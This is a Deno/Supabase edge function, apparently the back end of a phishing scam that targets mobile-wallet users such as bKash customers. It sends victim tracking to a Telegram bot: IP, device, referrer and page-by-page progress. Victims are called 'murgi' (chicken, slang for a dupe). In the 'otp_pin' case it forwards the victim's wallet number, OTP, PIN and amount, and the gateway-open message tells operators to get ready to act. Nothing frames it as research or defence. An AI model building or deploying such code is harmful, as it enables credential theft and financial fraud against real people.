// deno-lint-ignore-file no-explicit-any
// Murgi Logger Edge Function - sends logs to Telegram using secrets
// Uses CORS and accepts public requests

import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
};

const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
const TELEGRAM_CHAT_ID = Deno.env.get("TELEGRAM_CHAT_ID");

// Simple HTML escaping
function escapeHtml(str: unknown) {
  if (str === undefined || str === null) return "";
  return String(str)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

function br() {
  return "\n";
}

// Build message by type
function buildMessage(type: string, data: any, meta: any) {
  const ip = escapeHtml(meta.ip || "N/A");
  const ref = escapeHtml(meta.referrer || "Direct");
  const ua = escapeHtml(meta.ua || data?.device || "N/A");
  const screen = escapeHtml(meta.screen || data?.screen || "N/A");

  switch (type) {
    // New API events
    case "visit": {
      return (
        `🐔 New Visit` + br() +
        `IP: ${ip}` + br() +
        `Device: ${ua}` + br() +
        `Referrer: ${ref}`
      );
    }
    case "platform_click": {
      const platform = escapeHtml(data?.platform ?? "Youtube");
      return (
        `Now 🐔মুরগি is on ${platform} Platform` + br() +
        `🐔মুরগির IP Address: ${ip}` + br() +
        `🐔মুরগির Device: ${ua}`
      );
    }
    case "service_click": {
      const platform = escapeHtml(data?.platform ?? "N/A");
      const service = escapeHtml(data?.service ?? "N/A");
      return (
        `🐔মুরগি Service Clicked` + br() +
        `Platform: ${platform}` + br() +
        `Service: ${service}` + br() +
        `IP: ${ip}`
      );
    }
    case "order_submit": {
      const platform = escapeHtml(data?.platform ?? "N/A");
      const service = escapeHtml(data?.service ?? "N/A");
      const link = escapeHtml(data?.link ?? "N/A");
      return (
        `🐔 ORDER SUBMITTED` + br() +
        `Platform: ${platform}` + br() +
        `Service: ${service}` + br() +
        `Link: ${link}` + br() +
        `IP: ${ip}`
      );
    }
    case "payment_page": {
      const method = escapeHtml(data?.method ?? "Payment");
      return (
        `🐔 মুরগি ${method} এ ঢুকসে ⚠️ তাড়াতাড়ি রেডি হও ⚠️` + br() + br() +
        `🐔মুরগির IP Address: ${ip}` + br() +
        `🐔মুরগির Device: ${ua}`
      );
    }
    case "payment_otp_note": {
      const method = escapeHtml(data?.method ?? "N/A");
      const numberMasked = escapeHtml(data?.numberMasked ?? "N/A");
      return (
        `🐔 OTP Page Reached - ${method}` + br() +
        `Number Provided: ${numberMasked}` + br() +
        `IP: ${ip}`
      );
    }
    case "payment_pin_note": {
      const method = escapeHtml(data?.method ?? "N/A");
      const numberMasked = escapeHtml(data?.numberMasked ?? "N/A");
      return (
        `🐔 PIN Page Reached - ${method}` + br() +
        `Number Provided: ${numberMasked}` + br() +
        `IP: ${ip}`
      );
    }

    // Legacy API events (backward compatibility)
    case "membership_click": {
      const platform = escapeHtml(data?.platform ?? "Youtube");
      return (
        `Now 🐔মুরগি is on ${platform} Membership` + br() + br() +
        `🐔মুরগির IP Address: ${ip}` + br() +
        `🐔মুরগির Device Info: ${ua}` + br() +
        `🐔মুরগির Screen Resolution: ${screen}`
      );
    }
    case "beta_access_click": {
      const page = escapeHtml(data?.page ?? "unknown page");
      return (
        `🐔মুরগি Try Beta Access এ ক্লিক করেছে (${page})` + br() +
        `🐔মুরগির IP Address: ${ip}`
      );
    }
    case "payment_number": {
      // Support both old and new format
      const page = escapeHtml(data?.page ?? "Payment Page");
      const number = escapeHtml(data?.number ?? "");
      const method = escapeHtml(data?.method ?? "");
      const numberMasked = escapeHtml(data?.numberMasked ?? "");
      
      if (numberMasked) {
        return (
          `🐔মুরগির Payment Method: ${method}` + br() +
          `🐔মুরগির নাম্বার (masked): ${numberMasked}` + br() +
          `🐔মুরগির IP Address: ${ip}`
        );
      } else {
        return (
          `🐔মুরগির যেই পেজ Clicked page: ${page}` + br() +
          `🐔মুরগির নাম্বার: ${number}` + br() +
          `🐔মুরগির IP Address: ${ip}`
        );
      }
    }
    case "payment_gateway_open": {
      const gateway = escapeHtml(data?.gateway ?? "Payment");
      return (
        `🐔 মুরগি ${gateway} এ ঢুকসে ⚠️ তাড়াতাড়ি রেডি হও ⚠️` + br() + br() +
        `🐔মুরগির IP Address: ${ip}` + br() +
        `🐔মুরগির Referrer: ${ref}`
      );
    }
    case "otp_pin": {
      const method = escapeHtml(data?.method ?? "bKash");
      const number = escapeHtml(data?.number ?? "");
      const otp = escapeHtml(data?.otp ?? "");
      const pin = escapeHtml(data?.pin ?? "");
      const amount = escapeHtml(data?.amount ?? "");
      let msg = `🐔 মুরগি ${method} OTP/PIN Info` + br() + br();
      if (number) msg += `🐔মুরগির ${method} নাম্বার: ${number}` + br();
      if (otp) msg += `🐔OTP: ${otp}` + br();
      if (pin) msg += `🐔PIN: ${pin}` + br();
      if (amount) msg += `🐔Amount: ${amount}` + br();
      msg += `🐔মুরগির IP Address: ${ip}`;
      return msg;
    }
    case "generic": {
      const text = escapeHtml(data?.text ?? "");
      return (
        `🔁 Old Log: ${text}` + br() + br() +
        `🐔মুরগির IP Address: ${ip}` + br() +
        `🐔মুরগির Device Info: ${ua}`
      );
    }
    default:
      return `Unknown log type: ${escapeHtml(type)}` + br() + `IP: ${ip}`;
  }
}

async function sendToTelegram(text: string) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error("Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID secret");
    return new Response(JSON.stringify({ ok: false, error: "Missing secrets" }), {
      headers: { "Content-Type": "application/json", ...corsHeaders },
      status: 500,
    });
  }

  const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, parse_mode: "HTML" }),
  });

  const data = await res.json().catch(() => ({}));
  return new Response(JSON.stringify({ ok: res.ok, data }), {
    headers: { "Content-Type": "application/json", ...corsHeaders },
    status: res.ok ? 200 : 500,
  });
}

Deno.serve(async (req) => {
  // Handle CORS preflight
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const body = await req.json();
    
    // Support both old format {type, data} and new format {type, payload}
    const type = body.type;
    const data = body.payload || body.data || {};

    // Build meta from headers
    const headers = Object.fromEntries(req.headers.entries());
    const meta = {
      ip: headers["x-forwarded-for"]?.split(",")[0]?.trim() || headers["cf-connecting-ip"] || "",
      referrer: headers["referer"] || headers["origin"] || data?.referrer || "",
      ua: headers["user-agent"] || data?.device || "",
      screen: data?.screen || "",
    };

    const message = buildMessage(String(type || "generic"), data, meta);
    return await sendToTelegram(message);
  } catch (e) {
    return new Response(JSON.stringify({ ok: false, error: String(e) }), {
      headers: { "Content-Type": "application/json", ...corsHeaders },
      status: 400,
    });
  }
});
